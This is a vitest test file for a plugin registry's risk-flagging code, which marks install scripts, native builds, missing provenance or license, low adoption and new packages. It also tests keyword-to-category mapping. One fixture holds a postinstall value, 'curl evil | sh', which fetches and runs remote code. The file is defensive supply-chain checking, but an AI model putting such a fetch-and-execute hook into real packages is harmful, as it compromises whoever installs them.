import { describe, expect, it } from 'vitest'
import { categoryFor, riskFlagsFor } from './registry.js'

const NOW = new Date('2026-08-25T00:00:00.000Z')
const OLD = new Date('2024-01-01T00:00:00.000Z')

/** Everything a well-behaved, established package looks like. */
function clean(): Parameters<typeof riskFlagsFor>[0] {
  return {
    scripts: { build: 'tsc', test: 'vitest run' },
    hasAttestation: true,
    license: 'MIT',
    downloads: 5_000,
    publishedAt: OLD,
    now: NOW,
  }
}

describe('riskFlagsFor', () => {
  it('flags nothing on an established, attested package', () => {
    expect(riskFlagsFor(clean())).toEqual([])
  })

  it('flags lifecycle scripts that run on a registry install', () => {
    expect(riskFlagsFor({ ...clean(), scripts: { postinstall: 'node setup.js' } }))
      .toContain('install-scripts')
    expect(riskFlagsFor({ ...clean(), scripts: { preinstall: 'sh x' } })).toContain('install-scripts')
    expect(riskFlagsFor({ ...clean(), scripts: { install: 'sh x' } })).toContain('install-scripts')
  })

  it('does not flag prepare, which never runs for a published tarball', () => {
    // Flagging it would mark most TypeScript packages as risky and teach
    // people to ignore the flags.
    expect(riskFlagsFor({ ...clean(), scripts: { prepare: 'tsc', prepublishOnly: 'tsc' } })).toEqual([])
  })

  it('flags a native build', () => {
    expect(riskFlagsFor({ ...clean(), gypfile: true })).toContain('native-build')
    expect(riskFlagsFor({ ...clean(), scripts: { rebuild: 'node-gyp rebuild' } })).toContain('native-build')
  })

  it('flags a missing provenance attestation', () => {
    expect(riskFlagsFor({ ...clean(), hasAttestation: false })).toEqual(['no-provenance'])
  })

  it('flags a missing license', () => {
    expect(riskFlagsFor({ ...clean(), license: null })).toContain('no-license')
  })

  it('flags low adoption but not an unknown download count', () => {
    expect(riskFlagsFor({ ...clean(), downloads: 3 })).toContain('low-adoption')
    expect(riskFlagsFor({ ...clean(), downloads: null })).not.toContain('low-adoption')
  })

  it('flags a package published within the last month', () => {
    expect(riskFlagsFor({ ...clean(), publishedAt: new Date('2026-08-20T00:00:00.000Z') }))
      .toContain('new-package')
    expect(riskFlagsFor({ ...clean(), publishedAt: new Date('2026-06-01T00:00:00.000Z') }))
      .not.toContain('new-package')
    expect(riskFlagsFor({ ...clean(), publishedAt: null })).not.toContain('new-package')
  })

  it('reports every flag a bad candidate earns', () => {
    const flags = riskFlagsFor({
      scripts: { postinstall: 'curl evil | sh' },
      gypfile: true,
      hasAttestation: false,
      license: null,
      downloads: 0,
      publishedAt: NOW,
      now: NOW,
    })
    expect(new Set(flags)).toEqual(
      new Set(['install-scripts', 'native-build', 'no-provenance', 'no-license', 'low-adoption', 'new-package']),
    )
  })
})

describe('categoryFor', () => {
  it('maps keywords onto the catalog vocabulary', () => {
    expect(categoryFor(['dsh-plugin', 'agent'], '')).toBe('agent')
    expect(categoryFor([], 'a sidebar theme for the UI')).toBe('ui')
    expect(categoryFor([], 'openai model provider')).toBe('model')
    expect(categoryFor([], 'github integration')).toBe('integration')
    expect(categoryFor([], 'shell command tool')).toBe('tool')
  })

  it('falls back to other', () => {
    expect(categoryFor([], 'something entirely unrelated')).toBe('other')
  })
})
